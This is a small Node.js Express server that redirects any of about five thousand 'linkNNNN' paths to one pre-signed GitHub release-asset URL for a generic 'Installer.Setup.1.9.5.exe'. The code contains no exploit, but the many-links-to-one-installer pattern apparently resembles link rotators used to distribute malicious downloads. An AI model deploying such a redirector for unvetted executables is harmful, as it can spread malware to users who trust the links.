const express = require('express');
const app = express();

const TARGET_URL = 'https://objects.githubusercontent.com/github-production-release-asset-2e65be/982367413/1843381c-1843-4793-bcb2-b7ce5ed76a44?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250512%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250512T192414Z&X-Amz-Expires=300&X-Amz-Signature=48ee19145199d6a39f50e14b29376cc4201e300e1e1c7a725d3b340d5279c473&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DInstaller.Setup.1.9.5.exe&response-content-type=application%2Foctet-stream'; // Change to your actual file URL

app.get('/:linkId', (req, res) => {
  const linkId = req.params.linkId;

  if (/^link\d{4}$/.test(linkId) && parseInt(linkId.slice(4)) <= 5000) {
    res.redirect(TARGET_URL);
  } else {
    res.status(404).send('Invalid link');
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});
